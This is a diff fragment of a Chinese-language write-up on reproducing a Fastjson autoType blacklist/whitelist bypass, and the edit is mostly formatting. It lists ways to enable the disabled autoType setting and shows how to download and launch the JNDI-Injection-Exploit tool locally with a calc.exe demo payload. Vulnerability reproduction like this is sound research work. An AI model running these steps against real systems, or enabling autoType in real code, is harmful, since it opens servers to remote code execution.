@@ -997,10 +997,11 @@ org.springframework
 ### （2）黑白名单绕过的复现
 基于以上的分析，我们可以发现，只要我们把`payload`简单改一下就可以绕过。
 我们需要先开启默认禁用的`autoType`，有以下三种方式：
-- 使用代码进行添加：ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");或者ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-- 加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.
-- 在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.  
-我们先去`[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)`下载个`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`，然后启动利用工具：
+- 使用代码进行添加：`ParserConfig.getGlobalInstance().addAccept("org.example.,org.javaweb.");`或者`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`
+- 加上JVM启动参数：`-Dfastjson.parser.autoTypeAccept=org.example.`
+- 在`fastjson.properties`中添加：`fastjson.parser.autoTypeAccept=org.example.`
+
+我们先去`https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0`下载个`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`，然后启动利用工具：
 ```java
 java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
 ```
